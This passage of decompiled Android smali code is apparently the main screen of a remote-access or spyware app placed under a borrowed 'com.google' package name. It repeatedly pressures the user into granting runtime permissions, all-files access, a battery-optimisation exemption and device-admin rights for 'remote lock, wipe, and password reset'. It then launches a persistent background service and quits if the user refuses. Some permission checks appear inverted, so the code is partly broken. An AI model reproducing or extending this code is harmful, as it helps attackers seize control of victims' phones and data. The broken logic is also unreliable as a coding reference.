    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/16 v1, 0x68

    invoke-virtual {p0, v0, v1}, Lcom/google/xinoshell/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_skip_files_check
    :cond_skip_files
    :try_start_1
    sget-boolean v0, Lcom/google/xinoshell/utils/Config;->isDeviceAdmin:Z

    if-eqz v0, :cond_skip_admin_check

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isDeviceAdminActive()Z

    move-result v0

    if-nez v0, :cond_skip_admin

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/google/xinoshell/receivers/DeviceAdminReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "Enable device admin to allow remote lock, wipe, and password reset."

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x69

    invoke-virtual {p0, v0, v1}, Lcom/google/xinoshell/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_skip_admin_check
    :cond_skip_admin
    :try_start_2
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_end

    :catch_0
    :catch_1
    :catch_2
    :goto_end
    return-void
.end method

.method private checkAllSpecialPermissionsGranted()Z
    .locals 1

    :try_start_0
    sget-boolean v0, Lcom/google/xinoshell/utils/Config;->isAccessAllFiles:Z

    if-eqz v0, :cond_skip_files_chk

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isAllFilesAccessGranted()Z

    move-result v0

    if-eqz v0, :cond_check_admin

    :cond_skip_files_chk
    sget-boolean v0, Lcom/google/xinoshell/utils/Config;->isDeviceAdmin:Z

    if-eqz v0, :cond_all_special_ok

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isDeviceAdminActive()Z

    move-result v0

    if-eqz v0, :cond_check_admin
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_all_special_ok
    const/4 v0, 0x1

    return v0

    :cond_check_admin
    const/4 v0, 0x0

    return v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method private startService()V
    .locals 2

    .line 177
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/google/xinoshell/services/BgService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 178
    .local v0, "serviceIntent":Landroid/content/Intent;
    nop

    .line 179
    invoke-virtual {p0, v0}, Lcom/google/xinoshell/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 183
    return-void
.end method


# virtual methods
.method synthetic lambda$showPermissionSettingsDialog$2$com-google-xinoshell-MainActivity(Landroid/content/DialogInterface;I)V
    .locals 4
    .param p1, "dialog"    # Landroid/content/DialogInterface;
    .param p2, "which"    # I

    .line 269
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 270
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const-string v3, "package"

    invoke-static {v3, v1, v2}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 271
    .local v1, "uri":Landroid/net/Uri;
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 272
    invoke-virtual {p0, v0}, Lcom/google/xinoshell/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 273
    return-void
.end method

.method synthetic lambda$showPermissionSettingsDialog$3$com-google-xinoshell-MainActivity(Landroid/content/DialogInterface;I)V
    .locals 0
    .param p1, "dialog"    # Landroid/content/DialogInterface;
    .param p2, "which"    # I

    .line 275
    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->finishAffinity()V

    .line 276
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 4
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .line 283
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 284
    const/16 v0, 0x65

    if-ne p1, v0, :cond_after_battery

    .line 285
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isIgnoringBatteryOptimizations()Z

    move-result v0

    if-eqz v0, :cond_after_battery

    .line 286
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V

    .line 287
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->checkManufacturerSpecificSettings()V

    :cond_after_battery
    const/16 v0, 0x68

    if-eq p1, v0, :cond_after_files

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isAllFilesAccessGranted()Z

    move-result v0

    if-eqz v0, :cond_after_files

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/16 v1, 0x68

    invoke-virtual {p0, v0, v1}, Lcom/google/xinoshell/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    :cond_after_files
    sget-boolean v0, Lcom/google/xinoshell/utils/Config;->isDeviceAdmin:Z

    if-eqz v0, :cond_after_admin

    const/16 v0, 0x69

    if-eq p1, v0, :cond_after_admin

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isDeviceAdminActive()Z

    move-result v0

    if-eqz v0, :cond_after_admin

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/google/xinoshell/receivers/DeviceAdminReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "Enable device admin to allow remote lock, wipe, and password reset."

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x69

    invoke-virtual {p0, v0, v1}, Lcom/google/xinoshell/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    :cond_after_admin
    return-void
.end method

.method protected onResume()V
    .locals 1

    .line 290
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 291
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->checkAllPermissionsGranted()Z

    move-result v0

    if-nez v0, :cond_resume_ok

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->requestNecessaryPermissions()V

    :cond_resume_ok
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->checkAllSpecialPermissionsGranted()Z

    move-result v0

    if-eqz v0, :cond_resume_end

    return-void

    :cond_resume_end
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->requestAllSpecialPermissions()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 80
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 81
    sget v0, Lcom/google/xinoshell/R$layout;->activity_main:I

    invoke-virtual {p0, v0}, Lcom/google/xinoshell/MainActivity;->setContentView(I)V

    .line 82
    sget v0, Lcom/google/xinoshell/R$id;->webveiw1:I

    invoke-virtual {p0, v0}, Lcom/google/xinoshell/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    .line 83
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/google/xinoshell/MainActivity;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 84
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->setupWebView()V

    .line 86
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->checkAllPermissionsGranted()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/google/xinoshell/MainActivity;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "isDeviceDeActive"

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 87
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V

    goto :goto_0

    .line 89
    :cond_0
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->requestNecessaryPermissions()V

    .line 91
    :goto_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 7
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .line 243
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 244
    const/16 v0, 0x64

    if-ne p1, v0, :cond_3

    .line 245
    const/4 v0, 0x1

    .line 246
    .local v0, "allGranted":Z
    const/4 v1, 0x0

    .line 247
    .local v1, "i":I
    :goto_0
    array-length v2, p3

    if-ge v1, v2, :cond_1

    .line 248
    aget v2, p3, v1

    if-eqz v2, :cond_0

    .line 249
    const/4 v0, 0x0

    .line 247
    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 253
    :cond_1
    if-nez v0, :cond_2

    .line 254
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->showPermissionSettingsDialog()V

    return-void

    .line 257
    :cond_2
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->requestAllSpecialPermissions()V

    .line 258
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isIgnoringBatteryOptimizations()Z

    move-result v1

    if-nez v1, :cond_all_granted

    .line 259
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->requestBatteryOptimizationExemption()V

    goto :goto_dispatch

    .line 261
    :cond_all_granted
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->checkManufacturerSpecificSettings()V

    .line 263
    :cond_3
    :goto_dispatch
    return-void
.end method
